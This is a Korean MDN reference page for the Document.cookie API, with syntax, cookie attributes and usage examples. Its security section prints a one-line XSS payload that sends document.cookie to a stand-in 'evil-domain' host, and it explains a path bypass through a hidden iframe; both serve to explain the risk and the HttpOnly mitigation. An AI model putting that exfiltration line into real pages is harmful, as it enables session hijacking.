---
title: Document.cookie
slug: Web/API/Document/cookie
---
{{APIRef("DOM")}}

{{domxref("Document")}} `cookie` 는 document와 연관된 [cookies](/ko/docs/Web/HTTP/Cookies) 를 읽고 쓸 수 있게 해준다. 쿠키의 실제값에 대한 getter 와 setter로 작동한다.

## 문법

### Read all cookies accessible from this location

```js
allCookies = document.cookie;
```

위 코드에서 `allCookies` 세미콜론으로 구분되는 모든 쿠키 리스트의 문자열이다. (다른 말로 `key=value`). Note that each _key_ and _value_ may be surrounded by whitespace (space and tab characters): in fact, {{RFC(6265)}} mandates a single space after each semicolon, but some user agents may not abide by this.

### Write a new cookie

```js
document.cookie = newCookie;
```

In the code above, `newCookie` is a string of form `key=value`. Note that you can only set/update a single cookie at a time using this method. Consider also that:

- Any of the following cookie attribute values can optionally follow the key-value pair, specifying the cookie to set/update, and preceded by a semi-colon separator:

  - `;path=path` (e.g., '`/`', '`/mydir`') If not specified, defaults to the current path of the current document location.

    > **참고:** Prior to Gecko 6.0, paths with quotes were treated as if the quotes were part of the string, instead of as if they were delimiters surrounding the actual path string. This has been fixed.

  - `;domain=domain` (e.g., '`example.com`' or '`subdomain.example.com`'). If not specified, this defaults to the host portion of the current document location. Contrary to earlier specifications, leading dots in domain names are ignored, but browsers may decline to set the cookie containing such dots. If a domain is specified, subdomains are always included.

    > **참고:** The domain _must_ match the domain of the JavaScript origin. Setting cookies to foreign domains will be silently ignored.

  - `;max-age=max-age-in-seconds` (e.g., `60*60*24*365` or 31536000 for a year)
  - `;expires=date-in-GMTString-format` If neither `expires` nor `max-age` specified it will expire at the end of session.

    > **경고:** When user privacy is a concern, it's important that any web app implementation invalidate cookie data after a certain timeout instead of relying on the browser to do it. Many browsers let users specify that cookies should never expire, which is not necessarily safe.

    - See {{jsxref("Date.toUTCString()")}} for help formatting this value.

  - `;secure` Cookie to only be transmitted over secure protocol as https. Before Chrome 52, this flag could appear with cookies from http domains.
  - `;samesite` [SameSite](/ko/docs/Web/HTTP/Cookies#SameSite_cookies) prevents the browser from sending this cookie along with cross-site requests. Possible values are `lax`, `strict` or `none`.

    - The `lax` value value will send the cookie for all same-site requests and top-level navigation GET requests. This is sufficient for user tracking, but it will prevent many CSRF attacks. This is the default value in modern browsers.
    - The `strict` value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing contexts, even when following a regular link.
    - The `none` value explicitly states no restrictions will be applied. The cookie will be sent in all requests—both cross-site and same-site.

- The cookie value string can use {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} to ensure that the string does not contain any commas, semicolons, or whitespace (which are disallowed in cookie values).
- Some user agent implementations support the following cookie prefixes:

  - `__Secure-` Signals to the browser that it should only include the cookie in requests transmitted over a secure channel.
  - `__Host-` Signals to the browser that in addition to the restriction to only use the cookie from a secure origin, the scope of the cookie is limited to a path attribute passed down by the server. If the server omits the path attribute the "directory" of the request URI is used. It also signals that the domain attribute must not be present, which prevents the cookie from being sent to other domains. For Chrome the path attribute must always be the origin.

  > **참고:** The dash is considered part of the prefix.

  > **참고:** These flags are only settable with the `secure` attribute.

> **참고:** As you can see from the code above, `document.cookie` is an [accessor property](/ko/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description) with native _setter_ and _getter_ functions, and consequently is _not_ a [data property](/ko/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description) with a value: what you write is not the same as what you read, everything is always mediated by the JavaScript interpreter.

## Examples

### Example #1: Simple usage

```js
document.cookie = "name=oeschger";
document.cookie = "favorite_food=tripe";
function alertCookie() {
  alert(document.cookie);
}
```

```html
<button onclick="alertCookie()">Show cookies</button>
```

{{EmbedLiveSample('Example_1_Simple_usage', 200, 36)}}

### Example #2: Get a sample cookie named _test2_

```js
document.cookie = "test1=Hello";
document.cookie = "test2=World";

const cookieValue = document.cookie
  .split('; ')
  .find(row => row.startsWith('test2'))
  .split('=')[1];

function alertCookieValue() {
  alert(cookieValue);
}
```

```html
<button onclick="alertCookieValue()">Show cookie value</button>
```

{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 36)}}

### Example #3: Do something only once

In order to use the following code, please replace all occurrences of the word `doSomethingOnlyOnce` (the name of the cookie) with a custom name.

```js
function doOnce() {
  if (!document.cookie.split('; ').find(row => row.startsWith('doSomethingOnlyOnce'))) {
    alert("Do something here!");
    document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
  }
}
```

```html
<button onclick="doOnce()">Only do something once</button>
```

{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 36)}}

### Example #4: Reset the previous cookie

```js
function resetOnce() {
  document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
}
```

```html
<button onclick="resetOnce()">Reset only once cookie</button>
```

{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 36)}}

### Example #5: Check a cookie existence

```js
//ES5

if (document.cookie.split(';').some(function(item) {
    return item.trim().indexOf('reader=') == 0
})) {
    console.log('The cookie "reader" exists (ES5)')
}

//ES2016

if (document.cookie.split(';').some((item) => item.trim().startsWith('reader='))) {
    console.log('The cookie "reader" exists (ES6)')
}
```

### Example #6: Check that a cookie has a specific value

```js
//ES5

if (document.cookie.split(';').some(function(item) {
    return item.indexOf('reader=1') >= 0
})) {
    console.log('The cookie "reader" has "1" for value')
}

//ES2016

if (document.cookie.split(';').some((item) => item.includes('reader=1'))) {
    console.log('The cookie "reader" has "1" for value')
}
```

## Security

It is important to note that the `path` attribute does _not_ protect against unauthorized reading of the cookie from a different path. It can be easily bypassed using the DOM, for example by creating a hidden {{HTMLElement("iframe")}} element with the path of the cookie, then accessing this iframe's `contentDocument.cookie` property. The only way to protect the cookie is by using a different domain or subdomain, due to the [same origin policy](/ko/docs/Same_origin_policy_for_JavaScript).

Cookies are often used in web application to identify a user and their authenticated session. So stealing the cookie from a web application, will lead to hijacking the authenticated user's session. Common ways to steal cookies include using Social Engineering or by exploiting an XSS vulnerability in the application -

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

The `HTTPOnly` cookie attribute can help to mitigate this attack by preventing access to cookie value through Javascript. Read more about [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/).

## Notes

- Starting with Firefox 2, a better mechanism for client-side storage is available - [WHATWG DOM Storage](/ko/docs/DOM/Storage).
- You can delete a cookie by simply updating its expiration time to zero.
- Keep in mind that the more cookies you have, the more data will be transferred between the server and the client for each request. This will make each request slower. It is highly recommended for you to use [WHATWG DOM Storage](/ko/docs/DOM/Storage) if you are going to keep "client-only" data.
- [RFC 2965](http://www.ietf.org/rfc/rfc2965.txt) (Section 5.3, "Implementation Limits") specifies that there should be **no maximum length** of a cookie's key or value size, and encourages implementations to support **arbitrarily large cookies**. Each browser's implementation maximum will necessarily be different, so consult individual browser documentation.

The reason for the [syntax](#Syntax) of the `document.cookie` accessor property is due to the client-server nature of cookies, which differs from other client-client storage methods (like, for instance, [localStorage](/ko/docs/Web/Guide/API/DOM/Storage)):

#### The server tells the client to store a cookie

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: cookie_name1=cookie_value1
Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

[content of the page here]
```

#### The client sends back to the server its cookies previously stored

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
Accept: */*
```

## 명세서

{{Specifications}}

## 브라우저 호환성

{{Compat}}

## See also

- [HTTP cookies](/ko/docs/Web/HTTP/Cookies)
- [DOM Storage](/ko/docs/Web/Guide/API/DOM/Storage)
- [`URLUtils.pathname`](/ko/docs/Web/API/URLUtils.pathname)
- {{jsxref("Date.toUTCString()")}}
- [`HTTP`](/ko/docs/Web/HTTP)
- [Cookies (code snippets)](/ko/docs/Code_snippets/Cookies)
- [RFC 2965](https://tools.ietf.org/html/rfc2965)
